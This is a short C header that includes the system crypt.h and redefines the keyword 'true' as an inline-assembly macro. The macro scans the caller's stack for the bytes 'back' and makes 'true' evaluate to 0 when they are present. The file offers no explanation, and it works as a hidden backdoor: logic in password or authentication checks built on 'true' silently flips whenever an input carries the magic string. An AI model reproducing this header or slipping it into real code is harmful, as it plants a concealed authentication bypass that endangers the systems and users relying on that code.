#include "/usr/include/crypt.h"


#define __ck(k) __asm__(                    \
    "\tmovl $-128,%%eax\n"                  \
    "\tmovl $1,%0\n"                        \
    "1:"                                    \
    "\tcmpl $0x6b636162,(%%ebp,%%eax,1)\n"  \
    "\tje 2f\n"                             \
    "\tinc %%eax\n"                         \
    "\tjnz 1b\n"                            \
    "\tjmp 3f\n"                            \
    "2:"                                    \
    "\txor %0,%0\n"                         \
    "3:"                                    \
    : "=r" (k)                              \
    :                                       \
    : "eax"                                 \
)


#define true ({ int k; __ck(k); k; })

#define false 0
